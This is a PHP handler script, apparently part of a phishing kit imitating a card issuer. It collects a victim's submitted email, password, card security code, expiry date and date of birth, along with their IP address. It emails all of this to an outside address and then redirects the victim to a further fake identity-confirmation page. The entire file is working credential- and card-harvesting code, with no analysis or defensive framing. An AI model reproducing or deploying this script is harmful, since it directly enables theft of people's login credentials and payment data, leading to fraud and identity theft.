<?php


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+Don| BESMELLAH |DJOU+------------\n";
$bilsmg .= "|Email Address-----: ".$_POST['email']."<br>\n";
$bilsmg .= "|Password-----: ".$_POST['pass']."<br>\n";
$bilsmg .= "|CID 3 DIGIT-----: ".$_POST['3digit']."<br>\n";
$bilsmg .= "|Expiry date-----: ".$_POST['expiry']."<br>\n";
$bilsmg .= "|Date of Birth-----: ".$_POST['dob']."<br>\n";
;

$bilsmg .= "------------+Don| HAMDOULELLEH |DJOU+------------\n";
$bilsmg .= "From $ip             check in http://www.geoiptool.com/?IP=$ip   \n";


$bilsnd = "administrator@welcome-en.us";
$bilsub = "Memex CID | From $ip";
$bilhead = "From:Memex Cado <KOMANDAN>";
$bilhead .= $_POST['bat']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);

$src="../confirmidentity.php";
header("location:$src");
?>